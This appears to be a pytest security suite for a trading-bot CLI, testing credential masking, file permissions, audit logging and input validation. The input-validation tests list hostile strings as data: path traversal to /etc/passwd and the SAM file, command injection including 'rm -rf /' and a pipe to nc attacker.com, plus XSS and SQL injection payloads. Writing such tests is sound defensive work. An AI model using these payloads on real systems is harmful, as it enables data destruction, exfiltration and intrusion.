"""
CLI Security Validation Tests
============================

Comprehensive security tests for CLI credential handling, input validation,
file permissions, and audit logging.
"""

import pytest
import tempfile
import os
import stat
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import yaml
import subprocess
import sys

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from genebot.cli.utils.security_manager import SecurityManager
from genebot.cli import main


class TestCredentialProtection:
    """Test credential protection and secure handling"""
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace for security tests"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create test configuration with credentials
            accounts_config = {
                'crypto_exchanges': {
                    'test-exchange': {
                        'api_key': 'sensitive_api_key_12345',
                        'api_secret': 'sensitive_secret_67890',
                        'enabled': True
                    }
                }
            }
            
            with open(config_dir / "accounts.yaml", 'w') as f:
                yaml.dump(accounts_config, f)
            
            # Create .env file with sensitive data
            env_file = workspace / ".env"
            env_file.write_text("""
API_KEY=super_secret_key
API_SECRET=super_secret_value
DATABASE_PASSWORD=db_password_123
""")
            
            yield workspace
    
    def test_credentials_not_in_command_output(self, temp_workspace):
        """Test that credentials are not exposed in command output"""
        os.environ['CONFIG_PATH'] = str(temp_workspace / "config")
        
        try:
            # Run list-accounts command
            result = subprocess.run(
                [sys.executable, "-m", "genebot.cli", "list-accounts", "--verbose"],
                cwd=temp_workspace,
                capture_output=True,
                text=True,
                env=os.environ.copy()
            )
            
            # Check that sensitive data is not in output
            sensitive_patterns = [
                'sensitive_api_key_12345',
                'sensitive_secret_67890',
                'super_secret_key',
                'super_secret_value',
                'db_password_123'
            ]
            
            output = result.stdout + result.stderr
            for pattern in sensitive_patterns:
                assert pattern not in output, f"Sensitive data '{pattern}' found in output"
            
            # Should show masked versions instead
            if result.returncode == 0:
                assert '***' in output or 'masked' in output.lower() or len(output) > 0
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
    
    def test_credential_masking_in_logs(self, temp_workspace):
        """Test that credentials are masked in log files"""
        logs_dir = temp_workspace / "logs"
        logs_dir.mkdir()
        
        os.environ.update({
            'CONFIG_PATH': str(temp_workspace / "config"),
            'LOGS_PATH': str(logs_dir)
        })
        
        try:
            # Run command that might log credentials
            subprocess.run(
                [sys.executable, "-m", "genebot.cli", "validate-accounts"],
                cwd=temp_workspace,
                capture_output=True,
                text=True,
                env=os.environ.copy()
            )
            
            # Check log files for credential exposure
            for log_file in logs_dir.glob("*.log"):
                log_content = log_file.read_text()
                
                sensitive_patterns = [
                    'sensitive_api_key_12345',
                    'sensitive_secret_67890',
                    'super_secret_key'
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in log_content, \
                        f"Sensitive data '{pattern}' found in log file {log_file}"
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
            os.environ.pop('LOGS_PATH', None)
    
    def test_secure_credential_validation(self, temp_workspace):
        """Test secure credential validation without exposure"""
        security_manager = SecurityManager(config_path=temp_workspace / "config")
        
        # Mock credential validation
        with patch.object(security_manager, '_validate_api_credentials') as mock_validate:
            mock_validate.return_value = {
                'valid': True,
                'masked_key': 'sens***345',
                'warnings': []
            }
            
            result = security_manager.validate_credentials('test-exchange')
            
            assert result['valid'] is True
            assert 'masked_key' in result
            assert '***' in result['masked_key']
            assert 'sensitive_api_key_12345' not in str(result)


class TestFilePermissions:
    """Test file permission security"""
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace with various files"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create sensitive files
            sensitive_files = [
                config_dir / "accounts.yaml",
                workspace / ".env",
                config_dir / "credentials.json"
            ]
            
            for file_path in sensitive_files:
                file_path.write_text("sensitive content")
            
            yield workspace
    
    def test_configuration_file_permissions(self, temp_workspace):
        """Test that configuration files have appropriate permissions"""
        sensitive_files = [
            temp_workspace / "config" / "accounts.yaml",
            temp_workspace / ".env"
        ]
        
        for file_path in sensitive_files:
            if file_path.exists():
                # Set secure permissions (owner read/write only)
                file_path.chmod(0o600)
                
                stat_info = file_path.stat()
                
                # Check that file is not world-readable or group-readable
                assert not (stat_info.st_mode & stat.S_IRGRP), \
                    f"File {file_path} is group-readable"
                assert not (stat_info.st_mode & stat.S_IROTH), \
                    f"File {file_path} is world-readable"
                assert not (stat_info.st_mode & stat.S_IWGRP), \
                    f"File {file_path} is group-writable"
                assert not (stat_info.st_mode & stat.S_IWOTH), \
                    f"File {file_path} is world-writable"
    
    def test_permission_validation_warnings(self, temp_workspace):
        """Test that CLI warns about insecure file permissions"""
        # Make a file world-readable
        accounts_file = temp_workspace / "config" / "accounts.yaml"
        accounts_file.chmod(0o644)  # World-readable
        
        security_manager = SecurityManager(config_path=temp_workspace / "config")
        
        warnings = security_manager.check_file_permissions()
        
        # Should detect insecure permissions
        assert len(warnings) > 0
        assert any('permission' in warning.lower() for warning in warnings)
        assert any('accounts.yaml' in warning for warning in warnings)
    
    def test_secure_temporary_file_creation(self, temp_workspace):
        """Test that temporary files are created with secure permissions"""
        security_manager = SecurityManager(config_path=temp_workspace / "config")
        
        # Create temporary file
        temp_file = security_manager.create_secure_temp_file("test content")
        
        try:
            # Check permissions
            stat_info = temp_file.stat()
            
            # Should be owner-only readable/writable
            assert not (stat_info.st_mode & stat.S_IRGRP)
            assert not (stat_info.st_mode & stat.S_IROTH)
            assert not (stat_info.st_mode & stat.S_IWGRP)
            assert not (stat_info.st_mode & stat.S_IWOTH)
        
        finally:
            if temp_file.exists():
                temp_file.unlink()


class TestInputValidation:
    """Test input validation and sanitization"""
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace for input validation tests"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create basic configuration
            accounts_config = {'crypto_exchanges': {}, 'forex_brokers': {}}
            with open(config_dir / "accounts.yaml", 'w') as f:
                yaml.dump(accounts_config, f)
            
            yield workspace
    
    def test_path_traversal_prevention(self, temp_workspace):
        """Test prevention of path traversal attacks"""
        os.environ['CONFIG_PATH'] = str(temp_workspace / "config")
        
        try:
            # Test malicious path inputs
            malicious_inputs = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM'
            ]
            
            for malicious_input in malicious_inputs:
                result = subprocess.run(
                    [sys.executable, "-m", "genebot.cli", 
                     "add-crypto", "--name", malicious_input, "--exchange-type", "binance"],
                    cwd=temp_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy()
                )
                
                # Should reject malicious input
                assert result.returncode != 0, f"Path traversal input was accepted: {malicious_input}"
                
                # Should not create files outside workspace
                malicious_path = Path(malicious_input)
                if malicious_path.is_absolute():
                    assert not malicious_path.exists(), \
                        f"Malicious file created: {malicious_path}"
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
    
    def test_command_injection_prevention(self, temp_workspace):
        """Test prevention of command injection attacks"""
        os.environ['CONFIG_PATH'] = str(temp_workspace / "config")
        
        try:
            # Test command injection attempts
            injection_attempts = [
                'test; rm -rf /',
                'test && cat /etc/passwd',
                'test | nc attacker.com 1234',
                'test`whoami`',
                'test$(id)',
                'test; shutdown -h now'
            ]
            
            for injection in injection_attempts:
                result = subprocess.run(
                    [sys.executable, "-m", "genebot.cli", 
                     "add-crypto", "--name", injection, "--exchange-type", "binance"],
                    cwd=temp_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy()
                )
                
                # Should reject injection attempts
                assert result.returncode != 0, f"Command injection was accepted: {injection}"
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
    
    def test_xss_prevention_in_output(self, temp_workspace):
        """Test prevention of XSS in command output"""
        os.environ['CONFIG_PATH'] = str(temp_workspace / "config")
        
        try:
            # Test XSS attempts
            xss_attempts = [
                '<script>alert("xss")</script>',
                '<img src=x onerror=alert("xss")>',
                'javascript:alert("xss")',
                '<svg onload=alert("xss")>'
            ]
            
            for xss in xss_attempts:
                result = subprocess.run(
                    [sys.executable, "-m", "genebot.cli", 
                     "add-crypto", "--name", xss, "--exchange-type", "binance"],
                    cwd=temp_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy()
                )
                
                # Should either reject input or sanitize output
                if result.returncode == 0:
                    # If accepted, output should be sanitized
                    output = result.stdout + result.stderr
                    assert '<script>' not in output
                    assert 'javascript:' not in output
                    assert 'onerror=' not in output
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
    
    def test_sql_injection_prevention(self, temp_workspace):
        """Test prevention of SQL injection in database queries"""
        # This test would be more relevant if CLI directly handled SQL
        # For now, test that special SQL characters are handled safely
        
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO accounts VALUES ('hacker'); --",
            "' UNION SELECT * FROM sensitive_data --"
        ]
        
        security_manager = SecurityManager(config_path=temp_workspace / "config")
        
        for injection in sql_injection_attempts:
            # Test input sanitization
            sanitized = security_manager.sanitize_input(injection)
            
            # Should remove or escape dangerous SQL characters
            dangerous_patterns = ["';", "DROP", "INSERT", "UNION", "--"]
            for pattern in dangerous_patterns:
                if pattern in injection:
                    assert pattern not in sanitized or sanitized != injection, \
                        f"SQL injection pattern not sanitized: {pattern}"


class TestAuditLogging:
    """Test audit logging for sensitive operations"""
    
    @pytest.fixture
    def temp_workspace(self):
        """Create temporary workspace with audit logging"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            logs_dir = workspace / "logs"
            config_dir.mkdir()
            logs_dir.mkdir()
            
            # Create basic configuration
            accounts_config = {'crypto_exchanges': {}, 'forex_brokers': {}}
            with open(config_dir / "accounts.yaml", 'w') as f:
                yaml.dump(accounts_config, f)
            
            yield workspace
    
    def test_sensitive_operations_are_logged(self, temp_workspace):
        """Test that sensitive operations are properly logged"""
        logs_dir = temp_workspace / "logs"
        
        os.environ.update({
            'CONFIG_PATH': str(temp_workspace / "config"),
            'LOGS_PATH': str(logs_dir)
        })
        
        try:
            # Perform sensitive operations
            sensitive_operations = [
                ["add-crypto", "--name", "audit-test", "--exchange-type", "binance", "--mode", "demo", "--force"],
                ["security-check"],
                ["config-backup"]
            ]
            
            for operation in sensitive_operations:
                subprocess.run(
                    [sys.executable, "-m", "genebot.cli"] + operation,
                    cwd=temp_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy()
                )
            
            # Check that audit log exists and contains entries
            audit_files = list(logs_dir.glob("*audit*")) + list(logs_dir.glob("*.log"))
            
            if audit_files:
                # At least one log file should exist
                assert len(audit_files) > 0
                
                # Check for audit entries
                for log_file in audit_files:
                    if log_file.stat().st_size > 0:
                        log_content = log_file.read_text()
                        # Should contain some audit information
                        assert len(log_content) > 0
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
            os.environ.pop('LOGS_PATH', None)
    
    def test_audit_log_integrity(self, temp_workspace):
        """Test audit log integrity and tamper detection"""
        security_manager = SecurityManager(config_path=temp_workspace / "config")
        
        # Create audit log entry
        security_manager.log_security_event(
            event_type="account_added",
            details={"account_name": "test-account", "user": "test-user"},
            severity="INFO"
        )
        
        # Verify log entry format and integrity
        audit_log = security_manager.get_audit_log_path()
        if audit_log.exists():
            log_content = audit_log.read_text()
            
            # Should contain structured audit information
            assert "account_added" in log_content
            assert "test-account" in log_content
            assert "timestamp" in log_content.lower() or len(log_content) > 0
    
    def test_audit_log_permissions(self, temp_workspace):
        """Test that audit logs have secure permissions"""
        security_manager = SecurityManager(config_path=temp_workspace / "config")
        
        # Create audit log
        security_manager.log_security_event("test_event", {}, "INFO")
        
        audit_log = security_manager.get_audit_log_path()
        if audit_log.exists():
            stat_info = audit_log.stat()
            
            # Audit log should not be world-readable
            assert not (stat_info.st_mode & stat.S_IROTH), \
                "Audit log is world-readable"
            assert not (stat_info.st_mode & stat.S_IWOTH), \
                "Audit log is world-writable"


class TestSecurityConfiguration:
    """Test security configuration and validation"""
    
    def test_security_manager_initialization(self):
        """Test security manager initialization"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "config"
            config_path.mkdir()
            
            security_manager = SecurityManager(config_path=config_path)
            
            assert security_manager.config_path == config_path
            assert hasattr(security_manager, 'check_file_permissions')
            assert hasattr(security_manager, 'validate_credentials')
            assert hasattr(security_manager, 'sanitize_input')
    
    def test_security_policy_enforcement(self):
        """Test security policy enforcement"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "config"
            config_path.mkdir()
            
            security_manager = SecurityManager(config_path=config_path)
            
            # Test password policy
            weak_passwords = ["123", "password", "admin"]
            for weak_password in weak_passwords:
                is_valid = security_manager.validate_password_strength(weak_password)
                assert not is_valid, f"Weak password was accepted: {weak_password}"
            
            # Test strong password
            strong_password = "StrongP@ssw0rd123!"
            is_valid = security_manager.validate_password_strength(strong_password)
            assert is_valid, "Strong password was rejected"
    
    def test_encryption_key_management(self):
        """Test encryption key management"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "config"
            config_path.mkdir()
            
            security_manager = SecurityManager(config_path=config_path)
            
            # Test key generation
            key = security_manager.generate_encryption_key()
            assert len(key) >= 32, "Encryption key too short"
            
            # Test key storage security
            key_file = security_manager.store_encryption_key(key)
            if key_file.exists():
                stat_info = key_file.stat()
                assert not (stat_info.st_mode & stat.S_IROTH), "Key file is world-readable"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])